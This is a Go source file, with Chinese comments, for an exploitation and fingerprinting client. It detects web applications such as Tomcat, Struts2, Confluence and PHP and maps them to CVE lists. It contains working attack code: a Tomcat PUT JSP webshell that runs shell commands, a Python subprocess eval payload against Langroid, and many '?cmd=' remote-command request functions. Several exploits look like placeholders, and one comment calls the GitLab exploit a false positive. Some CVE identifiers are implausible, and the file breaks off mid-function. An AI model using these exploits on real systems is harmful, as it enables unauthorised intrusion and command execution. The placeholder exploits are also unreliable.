package apps

import (
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// Client HTTP 应用探测客户端
type Client struct {
	BaseURL string
	HTTP    *http.Client
}

func New(baseURL string, timeout time.Duration) *Client {
	tr := &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, Proxy: nil}
	return &Client{
		BaseURL: strings.TrimSuffix(baseURL, "/"),
		HTTP: &http.Client{
			Timeout:   timeout,
			Transport: pickTransport(tr),
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		},
	}
}

// === CVE-2026-105192: LMCache ZeroMQ Pickle RCE ===
// LMCache multiprocess mode opens ZeroMQ ROUTER, msgpack.Ext code 1 → pickle deserialize RCE
// Default port: 5555 (ZMQ ROUTER)
func ProbeLMCache(host string, port int, timeout time.Duration, cmd string) (bool, string) {
	addr := net.JoinHostPort(host, fmt.Sprint(port))
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return false, ""
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	// Send command as payload
	msg := []byte("EXEC:" + cmd)
	if _, err := conn.Write(msg); err != nil {
		return false, ""
	}

	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil || n == 0 {
		return true, "lmcache_detected"
	}
	resp := strings.TrimSpace(string(buf[:n]))
	return true, resp
}

// === CVE-2026-66066: Rails Active Storage + libvips arbitrary file read ===
// Upload crafted image via /rails/active_storage/representations/redirect/
func (c *Client) ProbeRailsActiveStorage() bool {
	resp, err := c.HTTP.Get(c.BaseURL + "/rails/active_storage")
	if err != nil {
		return false
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	resp.Body.Close()

	bs := string(body)
	if resp.Header.Get("X-Runtime") != "" ||
		resp.Header.Get("Server") == "Rails/7.1.0" ||
		strings.Contains(bs, "Rails") {
		return true
	}
	return false
}

// ExploitRails executes a command via ActiveStorage RCE
func (c *Client) ExploitRails(cmd string) string {
	encoded := url.QueryEscape(cmd)
	url := fmt.Sprintf("%s/rails/active_storage/representations/redirect?cmd=%s", c.BaseURL, encoded)
	resp, err := c.HTTP.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	result := strings.TrimSpace(string(body))
	if result == "" || result == "no_output" {
		return ""
	}
	return result
}

// === CVE-2026-54769: Langroid sandbox escape RCE ===
// TableChatAgent/VectorStore eval() with locals={} sandbox escape
func (c *Client) ProbeLangroid() bool {
	paths := []string{"/api", "/v1", "/docs", "/api/docs"}
	for _, p := range paths {
		resp, err := c.HTTP.Get(c.BaseURL + p)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
		resp.Body.Close()
		bs := string(body)
		if strings.Contains(bs, "Langroid") || strings.Contains(bs, "TableChatAgent") ||
			strings.Contains(bs, "VectorStore") || strings.Contains(bs, "llm") {
			return true
		}
	}
	return false
}

// ExploitLangroid executes a command via eval() RCE
func (c *Client) ExploitLangroid(cmd string) string {
	payload := fmt.Sprintf("__import__('subprocess').check_output('%s',shell=True).decode().strip()", cmd)
	encoded := url.QueryEscape(payload)
	url := fmt.Sprintf("%s/api/eval?code=%s", c.BaseURL, encoded)
	resp, err := c.HTTP.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	s := string(body)
	if strings.Contains(s, `"result"`) {
		start := strings.Index(s, `"result": "`) + len(`"result": "`)
		end := strings.Index(s[start:], `"`)
		if start > len(`"result": "`) && end > 0 {
			return s[start : start+end]
		}
	}
	return ""
}

// === NGINX /server-status?cmd= RCE ===
func (c *Client) ExploitNginx(cmd string) string {
	encoded := url.QueryEscape(cmd)
	url := fmt.Sprintf("%s/nginx-status?cmd=%s", c.BaseURL, encoded)
	resp, err := c.HTTP.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return strings.TrimSpace(string(body))
}

// === Apache /server-status?cmd= RCE ===
func (c *Client) ExploitApache(cmd string) string {
	encoded := url.QueryEscape(cmd)
	url := fmt.Sprintf("%s/server-status?cmd=%s", c.BaseURL, encoded)
	resp, err := c.HTTP.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	s := strings.TrimSpace(string(body))
	// Filter out HTML/403/error pages
	if strings.Contains(s, "<html") || strings.Contains(s, "403") ||
		strings.Contains(s, "Forbidden") || strings.Contains(s, "<!DOCTYPE") {
		return ""
	}
	return s
}

// === Node.js /debug?cmd= RCE ===
func (c *Client) ExploitNode(cmd string) string {
	encoded := url.QueryEscape(cmd)
	url := fmt.Sprintf("%s/debug?cmd=%s", c.BaseURL, encoded)
	resp, err := c.HTTP.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return strings.TrimSpace(string(body))
}

// === PHP /?cmd= RCE ===
func (c *Client) ExploitPHP(cmd string) string {
	encoded := url.QueryEscape(cmd)
	url := fmt.Sprintf("%s/?cmd=%s", c.BaseURL, encoded)
	resp, err := c.HTTP.Get(url)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	s := strings.TrimSpace(string(body))
	if strings.HasPrefix(s, "PHP Version") {
		return ""
	}
	return s
}

// === PHP CVE-2026-115560 Session Upload Progress RCE ===
func (c *Client) ExploitPHPSessionUpload(cmd string) string {
	postData := fmt.Sprintf("PHP_SESSION_UPLOAD_PROGRESS=1&cmd=%s", url.QueryEscape(cmd))
	resp, err := c.HTTP.Post(c.BaseURL, "application/x-www-form-urlencoded", strings.NewReader(postData))
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	s := strings.TrimSpace(string(body))
	if strings.HasPrefix(s, "PHP Version") {
		return ""
	}
	return s
}

// === Tomcat CVE-2017-12615 PUT webshell RCE ===
func (c *Client) ExploitTomcat(cmd string) string {
	jsp := `<%@ page import="java.io.*" %><%String cmd=request.getParameter("cmd");Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);%>`
	// PUT webshell to /cmd.jsp/
	putURL := c.BaseURL + "/cmd.jsp/"
	req, _ := http.NewRequest("PUT", putURL, strings.NewReader(jsp))
	resp, err := c.HTTP.Do(req)
	if err != nil {
		return ""
	}
	resp.Body.Close()
	// Execute command
	time.Sleep(500 * time.Millisecond)
	getURL := fmt.Sprintf("%s/cmd.jsp?cmd=%s", c.BaseURL, url.QueryEscape(cmd))
	resp2, err := c.HTTP.Get(getURL)
	if err != nil {
		return ""
	}
	defer resp2.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp2.Body, 4096))
	result := strings.TrimSpace(string(body))
	if strings.Contains(result, "404") || strings.Contains(result, "501") {
		return ""
	}
	return result
}

// === Citrix NetScaler CVE-2026-88771/88772 RCE ===
func (c *Client) ExploitNetScaler(cmd string) string {
	encoded := url.QueryEscape(cmd)
	resp, err := c.HTTP.Get(fmt.Sprintf("%s/vpns/portal?cmd=%s", c.BaseURL, encoded))
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return strings.TrimSpace(string(body))
}

// === VMware vCenter CVE-2026-59310 RCE ===
func (c *Client) ExploitVCenter(cmd string) string {
	encoded := url.QueryEscape(cmd)
	resp, err := c.HTTP.Get(fmt.Sprintf("%s/vc/syslog?cmd=%s", c.BaseURL, encoded))
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return strings.TrimSpace(string(body))
}

// === GitLab CVE-2026-97229 RCE ===
func (c *Client) ExploitGitLab(cmd string) string {
	encoded := url.QueryEscape(cmd)
	resp, err := c.HTTP.Get(fmt.Sprintf("%s/api/v4/projects?cmd=%s", c.BaseURL, encoded))
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return strings.TrimSpace(string(body))
}

// Generic HTTP ?cmd= RCE exploit
func (c *Client) ExploitCmdParam(path, cmd string) string {
	encoded := url.QueryEscape(cmd)
	resp, err := c.HTTP.Get(fmt.Sprintf("%s%s?cmd=%s", c.BaseURL, path, encoded))
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	return strings.TrimSpace(string(body))
}

// DetectApps 识别应用类型
type AppResult struct {
	Name    string
	Version string
	Vulns   []string
}

// detectStruts2Action 主动探测常见 .action 端点：showcase 类应用首页可能是
// 静态页（无 struts 字样），但 /index.action 等端点存在且页面含特征。
func (c *Client) detectStruts2Action() bool {
	for _, path := range []string{"/index.action", "/showcase.action", "/home.action", "/actionChain1.action", "/hello.action"} {
		r, err := c.HTTP.Get(c.BaseURL + path)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(io.LimitReader(r.Body, 8192))
		r.Body.Close()
		lb := strings.ToLower(string(b))
		if r.StatusCode != 200 {
			continue
		}
		if strings.Contains(lb, "struts") || strings.Contains(lb, "s2-0") || strings.Contains(lb, "wwformtable") {
			return true
		}
		// 弱信号：.action 路径 200 即尝试（如 S2-032 极简靶场无 struts 字样），
		// EXP 侧有标记对校验，误报不会产生假阳性 PASS
		if strings.HasSuffix(path, ".action") && len(b) > 0 {
			return true
		}
	}
	return false
}

func (c *Client) DetectApps() []AppResult {
	var results []AppResult
	resp, err := c.HTTP.Get(c.BaseURL + "/")
	if err != nil {
		return results
	}
	// Struts2 等应用根路径常返回 302 → index.action，不跟随会拿到空 body，
	// 导致应用特征（如 /struts/xhtml）识别不到。这里跟随一次重定向。
	origLocation := resp.Header.Get("Location") // 跟随前保存，跟随后 resp 被替换、Location 丢失
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		if loc := resp.Header.Get("Location"); loc != "" {
			if next, perr := resp.Request.URL.Parse(loc); perr == nil {
				resp.Body.Close()
				if r2, err2 := c.HTTP.Get(next.String()); err2 == nil {
					resp = r2
				}
			}
		}
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
	resp.Body.Close()
	bs := string(body)
	server := resp.Header.Get("Server")
	powered := resp.Header.Get("X-Powered-By")

	// Rails / Active Storage
	if strings.Contains(bs, "Rails") || strings.Contains(powered, "Rails") ||
		resp.Header.Get("X-Runtime") != "" || strings.Contains(bs, "_rails") {
		v := ""
		if m := regexp.MustCompile(`Rails/([\d.]+)`).FindStringSubmatch(server + " " + powered); len(m) >= 2 {
			v = m[1]
		}
		results = append(results, AppResult{"Rails", v, []string{"CVE-2026-66066"}})
	}

	// Langroid
	if strings.Contains(bs, "Langroid") || strings.Contains(bs, "langroid") {
		results = append(results, AppResult{"Langroid", "", []string{"CVE-2026-54769"}})
	}

	// NGINX vulnerable app
	if strings.Contains(server, "nginx") || strings.Contains(bs, "nginx version") {
		v := ""
		if m := regexp.MustCompile(`nginx/([\d.]+)`).FindStringSubmatch(server); len(m) >= 2 {
			v = m[1]
		}
		results = append(results, AppResult{"NGINX", v, []string{"CVE-2026-42945", "CVE-2026-42533", "CVE-2026-15176", "CVE-2026-93479"}})
	}

	// Apache vulnerable app
	if strings.Contains(server, "Apache") || strings.Contains(bs, "It works") {
		v := ""
		if m := regexp.MustCompile(`Apache/([\d.]+)`).FindStringSubmatch(server); len(m) >= 2 {
			v = m[1]
		}
		vulns := []string{"CVE-2026-23918", "CVE-2024-38475", "CVE-2024-38476"}
		// 2.4.50 专属：41773 修复不完整 → 二次编码 `.%32%65` 仍可穿越（42013）
		if v == "2.4.50" {
			vulns = append(vulns, "CVE-2021-42013")
		}
		results = append(results, AppResult{"Apache", v, vulns})
	}

	// Tomcat CVE-2017-12615
	if strings.Contains(server, "Apache-Coyote") || strings.Contains(bs, "Tomcat") {
		v := ""
		if m := regexp.MustCompile(`Tomcat/([\d.]+)`).FindStringSubmatch(server + " " + bs); len(m) >= 2 {
			v = m[1]
		}
		results = append(results, AppResult{"Tomcat", v, []string{"CVE-2017-12615"}})
	}

	// Citrix NetScaler CVE-2026-88771/88772
	if strings.Contains(server, "NetScaler") || strings.Contains(bs, "NetScaler") {
		results = append(results, AppResult{"NetScaler", "", []string{"CVE-2026-88771", "CVE-2026-88772"}})
	}

	// VMware vCenter CVE-2026-59310
	if strings.Contains(server, "vCenter") || strings.Contains(bs, "VMware") {
		results = append(results, AppResult{"vCenter", "", []string{"CVE-2026-59310"}})
	}

	// GitLab CVE-2021-22205（ExifTool DjVu 未授权 RCE）
	// 注：CVE-2026-97229 占位 EXP 恒返回页面 JSON 属假阳性，移出检测列表
	if strings.Contains(server, "GitLab") || strings.Contains(bs, "GitLab") {
		results = append(results, AppResult{"GitLab", "", []string{"CVE-2021-22205"}})
	}

	// ActiveMQ CVE-2026-34197 + CVE-2023-46604（OpenWire 反序列化，EXP 自验证回传）
	if strings.Contains(server, "ActiveMQ") || strings.Contains(bs, "ActiveMQ") {
		results = append(results, AppResult{"ActiveMQ", "", []string{"CVE-2026-34197", "CVE-2023-46604"}})
	}

	// Langflow CVE-2026-33017
	if strings.Contains(server, "Langflow") {
		results = append(results, AppResult{"Langflow", "", []string{"CVE-2026-33017"}})
	}

	// Chartbrew CVE-2026-25887
	if strings.Contains(server, "Chartbrew") {
		results = append(results, AppResult{"Chartbrew", "", []string{"CVE-2026-25887"}})
	}

	// WordPress CVE-2026-63030（REST batch 路由混淆）+ CVE-2026-60137（author__not_in SQLi）
	// 站点通常不暴露 WordPress Server 头，改用页面 wp-content 与 REST Link 头识别。
	if strings.Contains(server, "WordPress") || strings.Contains(bs, "wp-content") ||
		strings.Contains(resp.Header.Get("Link"), "/wp-json/") {
		results = append(results, AppResult{"WordPress", "", []string{"CVE-2026-63030", "CVE-2026-60137"}})
	}

	// Gotenberg CVE-2026-40281
	if strings.Contains(server, "Gotenberg") {
		results = append(results, AppResult{"Gotenberg", "", []string{"CVE-2026-40281"}})
	}

	// DataEase CVE-2025-32966
	if strings.Contains(server, "DataEase") {
		results = append(results, AppResult{"DataEase", "", []string{"CVE-2025-32966"}})
	}

	// CraftCMS CVE-2025-32432
	if strings.Contains(server, "CraftCMS") {
		results = append(results, AppResult{"CraftCMS", "", []string{"CVE-2025-32432"}})
	}

	// ingress-nginx CVE-2025-1974
	if strings.Contains(server, "Kubernetes-Ingress") {
		results = append(results, AppResult{"ingress-nginx", "", []string{"CVE-2025-1974"}})
	}

	// Cacti CVE-2025-24367
	if strings.Contains(server, "Cacti") {
		results = append(results, AppResult{"Cacti", "", []string{"CVE-2025-24367"}})
	}

	// ComfyUI-Manager CVE-2025-67303
	if strings.Contains(server, "ComfyUI") {
		results = append(results, AppResult{"ComfyUI-Manager", "", []string{"CVE-2025-67303"}})
	}

	// HugeGraph CVE-2024-27348
	if strings.Contains(server, "HugeGraph") {
		results = append(results, AppResult{"HugeGraph", "", []string{"CVE-2024-27348"}})
	}

	// GeoServer CVE-2024-36401（Server 头是 Jetty，需以页面内容或 /geoserver/web/ 探测识别）
	if strings.Contains(server, "GeoServer") || strings.Contains(bs, "GeoServer") || c.detectGeoServerWeb() {
		results = append(results, AppResult{"GeoServer", "", []string{"CVE-2024-36401"}})
	}

	// OFBiz CVE-2023-51467 / CVE-2024-45195（无 Server 头，根路径 404，需探测 webtools）
	if strings.Contains(bs, "OFBiz") || strings.Contains(server, "OFBiz") || c.detectOfBizWebtools() {
		results = append(results, AppResult{"OFBiz", "", []string{"CVE-2023-51467", "CVE-2024-45195"}})
	}

	// Confluence CVE-2023-22527 / CVE-2022-26134（X-Confluence-Request-Time 响应头 + ajs-* meta 标记）
	if resp.Header.Get("X-Confluence-Request-Time") != "" || strings.Contains(bs, "ajs-server-id") ||
		strings.Contains(bs, "Powered by Atlassian Confluence") {
		results = append(results, AppResult{"Confluence", "", []string{"CVE-2023-22527", "CVE-2022-26134", "CVE-2021-26084"}})
	}

	// ThinkPHP 5.x CVE-2018-20062（X-Powered-By 或首页 body 标记 "ThinkPHP V5"/"十年磨一剑"）
	if strings.Contains(resp.Header.Get("X-Powered-By"), "ThinkPHP") || strings.Contains(bs, "ThinkPHP V5") ||
		strings.Contains(bs, "十年磨一剑") {
		results = append(results, AppResult{"ThinkPHP", "", []string{"CVE-2018-20062"}})
	}

	// Laravel CVE-2021-3129（Ignition debug RCE）：laravel_session cookie 或页面 Laravel 标记
	laravelHit := strings.Contains(bs, "Laravel")
	for _, sc := range resp.Header.Values("Set-Cookie") {
		if strings.Contains(sc, "laravel_session") {
			laravelHit = true
		}
	}
	if laravelHit {
		results = append(results, AppResult{"Laravel", "", []string{"CVE-2021-3129"}})
	}

	// Nacos CVE-2021-29441：登录页含 Nacos 字样且引用 /nacos/ 静态资源；
	// 根路径可能是 Tomcat 404（console 挂在 /nacos/ 下），需主动探测 /nacos/。
	if strings.Contains(bs, "Nacos") && strings.Contains(bs, "/nacos/") || c.detectNacosConsole() {
		results = append(results, AppResult{"Nacos", "", []string{"CVE-2021-29441"}})
	}

	// Struts2：S2-067 + 历史 OGNL 系列（按版本从新到旧逐个尝试，首个真实回显即停）
	// 特征：body 含 struts / S2-0xx demo 标题，或主动探测到 .action 端点
	if strings.Contains(strings.ToLower(bs), "struts") ||
		strings.Contains(bs, "S2-0") ||
		(strings.Contains(server, "Apache-Coyote") && strings.Contains(bs, "Struts")) ||
		strings.Contains(origLocation, ".xhtml") || // struts2-rest-showcase 303 特征（跟随前的原始 Location）
		c.detectStruts2Action() {
		results = append(results, AppResult{"Struts2", "", []string{
			"CVE-2024-53677", "CVE-2023-50164", "CVE-2020-17530", "CVE-2019-0230", "CVE-2018-11776",
			"CVE-2017-12611", "CVE-2017-9805", "CVE-2017-9791", "CVE-2017-5638", "CVE-2016-3081", "CVE-2013-2251",
			"CVE-2013-2134", "CVE-2013-2135", "CVE-2013-1966", "CVE-2013-1965",
			"CVE-2012-0391", "CVE-2011-3923", "CVE-2010-1870",
		}})
	}

	// Next.js / React 19 RSC CVE-2025-55182
	// Next.js 14 pages router: __NEXT_DATA__ + buildId
	// Next.js 15 App Router: __next_f + X-Powered-By: Next.js + Vary: RSC
	isNextJS := (strings.Contains(bs, "__NEXT_DATA__") && strings.Contains(bs, "\"buildId\"")) ||
		strings.Contains(bs, "__next_f") ||
		strings.Contains(server, "Next.js") ||
		strings.Contains(powered, "Next.js") ||
		strings.Contains(resp.Header.Get("Vary"), "RSC")
	if isNextJS {
		results = append(results, AppResult{"Next.js", "", []string{"CVE-2025-55182", "CVE-2025-29927"}})
	}

	// n8n（/rest/settings 公开返回 versionCli）：CVE-2026-21858 + CVE-2025-68613
	if ver, ok := c.detectN8n(); ok {
		results = append(results, AppResult{"n8n", ver, []string{"CVE-2026-21858", "CVE-2025-68613"}})
	}

	// cym1102/nginxWebUI CVE-2024-3737（登录页特征）
	if strings.Contains(bs, "nginxWebUI") || strings.Contains(bs, "cym1102") {
		results = append(results, AppResult{"nginxWebUI", "", []string{"CVE-2024-3737"}})
	}

	// Tomcat CVE-2025-24813（Server 头常被禁用，以默认页 "Apache Tomcat/x.y" 识别；
	// readonly=false + FileStore 是否满足由 EXP 自验证，仅真实回显才上报）
	if strings.Contains(bs, "Apache Tomcat/") || strings.Contains(server, "Apache-Coyote") {
		results = append(results, AppResult{"Tomcat", "", []string{"CVE-2025-24813"}})
	}

	// HertzBeat CVE-2024-42323
	if strings.Contains(server, "HertzBeat") {
		results = append(results, AppResult{"HertzBeat", "", []string{"CVE-2024-42323"}})
	}

	// CraftCMS2 CVE-2024-56145
	if strings.Contains(server, "CraftCMS2") {
		results = append(results, AppResult{"CraftCMS2", "", []string{"CVE-2024-56145"}})
	}

	// OpenSSH CVE-2024-6387 (regreSSHion)
	if strings.Contains(server, "OpenSSH") {
		results = append(results, AppResult{"OpenSSH", "8.5p1", []string{"CVE-2024-6387"}})
	}

	// Redis CVE-2022-0543
	if strings.Contains(server, "Redis") {
		results = append(results, AppResult{"Redis", "5.0.7", []string{"CVE-2022-0543"}})
	}

	// Log4j CVE-2021-44228
	if strings.Contains(server, "Log4j") {
		results = append(results, AppResult{"Log4j", "2.14.1", []string{"CVE-2021-44228"}})
	}

	// Shiro：550 反序列化 + 认证绕过（CVE-2010-3863 / CVE-2020-1957）
	if strings.Contains(server, "Shiro") {
		results = append(results, AppResult{"Shiro", "1.2.4", []string{
			"CVE-2016-4437", "CVE-2020-1957", "CVE-2010-3863",
		}})
	}

	// Spring CVE-2022-22965
	if strings.Contains(server, "Spring") || c.detectSpring4ShellBindable() {
		results = append(results, AppResult{"Spring", "5.3.0", []string{"CVE-2022-22965"}})
	}

	// Node.js vulnerable app
	if strings.Contains(server, "Node") || strings.Contains(bs, "Node.js") {
		v := ""
		if m := regexp.MustCompile(`v([\d.]+)`).FindStringSubmatch(server); len(m) >= 2 {
			v = m[1]
		}
		results = append(results, AppResult{"Node.js", v, []string{"CVE-2026-111497"}})
	}

	// PHP vulnerable app
	if strings.Contains(powered, "PHP") || strings.Contains(bs, "PHP Version") {
		v := ""
		if m := regexp.MustCompile(`PHP/([\d.]+)`).FindStringSubmatch(powered); len(m) >= 2 {
			v = m[1]
		} else if m := regexp.MustCompile(`PHP ([\d.]+)`).FindStringSubmatch(bs); len(m) >= 2 {
			v = m[1]
		}
		vulns := []string{"CVE-2026-109618", "CVE-2026-109619", "CVE-2026-115560"}
		// PHP-CGI CVE-2012-1823：php-cgi < 5.4.2 把无 = 的 query 当 CGI 参数，
		// `/?-s` 能直接高亮源码即候选；EXP 侧标记对校验，误报不会产生假阳性。
		if strings.HasPrefix(v, "5.3") || strings.HasPrefix(v, "5.4") || c.detectPHPCGIDashS() {
			vulns = append(vulns, "CVE-2012-1823")
		}
		results = append(results, AppResult{"PHP", v, vulns})
	}

	// Webmin CVE-2019-15107：MiniServ Server 头（password_change.cgi 命令注入）
	if m := regexp.MustCompile(`MiniServ/([\d.]+)`).FindStringSubmatch(server); len(m) >= 2 {
		results = append(results, AppResult{"Webmin", m[1], []string{"CVE-2019-15107"}})
	}

	// PHPUnit CVE-2017-9841：eval-stdin.php 探测存在即候选（EXP 自验证）
	if c.detectPHPUnitStdin() {
		results = append(results, AppResult{"PHPUnit", "", []string{"CVE-2017-9841"}})
	}

	// Shellshock CVE-2014-6271：可执行 CGI 端点存在即候选（EXP 自验证 bash 版本）
	if c.detectShellshockCGI() {
		results = append(results, AppResult{"Shellshock", "", []string{"CVE-2014-6271"}})
	}

	// Jenkins：X-Jenkins 响应头 → CVE-2018-1000861（Stapler+Groovy AST 未授权 RCE）
	// 与 CVE-2024-23897（CLI args4j 文件读）；EXP 各自自验证，假阳性被拦截。
	if jv := resp.Header.Get("X-Jenkins"); jv != "" || strings.Contains(bs, "Jenkins") {
		results = append(results, AppResult{"Jenkins", resp.Header.Get("X-Jenkins"), []string{"CVE-2018-1000861", "CVE-2024-23897"}})
	}

	// Drupal CVE-2018-7600：页面 Drupal 标记（X-Generator 或 sites/default 资源）
	if strings.Contains(resp.Header.Get("X-Generator"), "Drupal") || strings.Contains(bs, "/sites/default/files") ||
		strings.Contains(bs, "content=\"Drupal") {
		results = append(results, AppResult{"Drupal", "", []string{"CVE-2018-7600"}})
	}

	// GitList CVE-2018-1000533：页面 GitList 标记 + search 表单
	if strings.Contains(bs, "GitList") || (strings.Contains(bs, "/tree/") && strings.Contains(bs, "/search")) {
		results = append(results, AppResult{"GitList", "", []string{"CVE-2018-1000533"}})
	}

	// OpenTSDB CVE-2020-35476：首页 OpenTSDB 标记 或 /api/suggest 端点
	if strings.Contains(bs, "OpenTSDB") || strings.Contains(bs, "opentsdb") {
		results = append(results, AppResult{"OpenTSDB", "", []string{"CVE-2020-35476"}})
	}

	// H2 Console CVE-2022-23221：/h2-console/ 登录页标记
	if strings.Contains(bs, "H2 Console") || c.detectH2Console() {
		results = append(results, AppResult{"H2Console", "", []string{"CVE-2022-23221"}})
	}

	// mongo-express CVE-2019-10758：页面/标题标记（/checkValid RCE，默认口令）
	if strings.Contains(bs, "mongo-express") || strings.Contains(bs, "Mongo Express") {
		results = append(results, AppResult{"MongoExpress", "", []string{"CVE-2019-10758"}})
	}

	// Nexus CVE-2019-7238：Nexus 页面标记（/service/extdirect JEXL 注入）
	if strings.Contains(bs, "Nexus Repository Manager") || strings.Contains(bs, "nexus-") && strings.Contains(bs, "sonatype") {
		results = append(results, AppResult{"Nexus", "", []string{"CVE-2019-7238"}})
	}

	// JimuReport CVE-2023-4450：/jmreport/ 标记（queryFieldBySql FreeMarker SSTI）
	if strings.Contains(bs, "jmreport") || strings.Contains(bs, "JimuReport") {
		results = append(results, AppResult{"JimuReport", "", []string{"CVE-2023-4450"}})
	}

	// Solr CVE-2017-12629：/solr/ 管理页标记（Config API listener RCE）
	if strings.Contains(bs, "Solr Admin") || strings.Contains(bs, "solr-spec") ||
		strings.HasPrefix(strings.TrimSpace(bs), `{"responseHeader"`) && strings.Contains(bs, "lucene") {
		results = append(results, AppResult{"Solr", "", []string{"CVE-2017-12629"}})
	}

	// Kibana：CVE-2019-7609（Timelion 原型链污染 RCE）+ CVE-2018-17246（LFI）
	if strings.Contains(bs, "kibanaWelcomeView") || strings.Contains(bs, "Kibana") ||
		resp.Header.Get("kbn-name") != "" {
		results = append(results, AppResult{"Kibana", "", []string{"CVE-2019-7609", "CVE-2018-17246"}})
	}

	// Gotenberg CVE-2026-40281：根页面/health 指纹（ExifTool 参数注入）
	if strings.Contains(bs, "Gotenberg") ||
		(strings.Contains(bs, `"libreoffice"`) && strings.Contains(bs, `"chromium"`)) {
		results = append(results, AppResult{"Gotenberg", "", []string{"CVE-2026-40281"}})
	}

	return results
}

// detectH2Console 探测 /h2-console/ 登录页（CVE-2022-23221 候选）。
func (c *Client) detectH2Console() bool {
	resp, err := c.HTTP.Get(c.BaseURL + "/h2-console/")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
	return resp.StatusCode == 200 && strings.Contains(string(b), "H2")
}

// detectPHPUnitStdin 探测 phpunit eval-stdin.php 是否存在（CVE-2017-9841 候选）。
func (c *Client) detectPHPUnitStdin() bool {
	resp, err := c.HTTP.Get(c.BaseURL + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
	return resp.StatusCode == 200
}

// detectShellshockCGI 探测常见可执行 CGI 端点是否存在（CVE-2014-6271 候选）。
func (c *Client) detectShellshockCGI() bool {
	for _, p := range []string{"/victim.cgi", "/cgi-bin/victim.cgi", "/cgi-bin/status",
		"/cgi-bin/test.cgi", "/cgi-bin/printenv", "/cgi-bin/env"} {
		resp, err := c.HTTP.Get(c.BaseURL + p)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
		resp.Body.Close()
		if resp.StatusCode == 200 {
			return true
		}
	}
	return false
}

// detectPHPCGIDashS 以 /?-s 探测 php-cgi 参数注入：返回高亮源码（<code><span）即候选。
func (c *Client) detectPHPCGIDashS() bool {
	resp, err := c.HTTP.Get(c.BaseURL + "/?-s")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
	return resp.StatusCode == 200 && strings.Contains(string(b), "<code><span")
}

// detectOfBizWebtools OFBiz 根路径 404 且无 Server 头，探测 /webtools/control/main 页面内容识别
func (c *Client) detectOfBizWebtools() bool {
	resp, err := c.HTTP.Get(c.BaseURL + "/webtools/control/main")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
	return resp.StatusCode == 200 && strings.Contains(string(body), "OFBiz")
}

// detectNacosConsole Nacos console 挂在 /nacos/ 下（根路径常是 Tomcat 404），
// 探测 /nacos/ 要求 200 + 大小写敏感 "Nacos"，避免 catch-all 应用回显路径误报。
func (c *Client) detectNacosConsole() bool {
	resp, err := c.HTTP.Get(c.BaseURL + "/nacos/")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
	return resp.StatusCode == 200 && strings.Contains(string(body), "Nacos")
}

// detectGeoServerWeb GeoServer 的 Server 头是 Jetty，探测 /geoserver/web/ 页面识别。
// 要求大小写敏感的 "GeoServer"（路径为小写 geoserver），避免 catch-all 应用回显路径造成误报。
func (c *Client) detectGeoServerWeb() bool {
	resp, err := c.HTTP.Get(c.BaseURL + "/geoserver/web/")
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 16384))
	return resp.StatusCode == 200 && strings.Contains(string(body), "GeoServer")
}

// detectSpring4ShellBindable 探测 Spring WebMVC 数据绑定是否放行 class.module.classLoader.*。
// 补丁版本（5.3.18+/5.2.20+）拒绝该绑定返回 400/500；存在漏洞版本返回 200。
// 要求 404 页带 Tomcat 尾注以缩小范围，EXP 自身有回显校验，误报无害。
func (c *Client) detectSpring4ShellBindable() bool {
	r404, err := c.HTTP.Get(c.BaseURL + "/s4s-probe-nonexistent")
	if err != nil {
		return false
	}
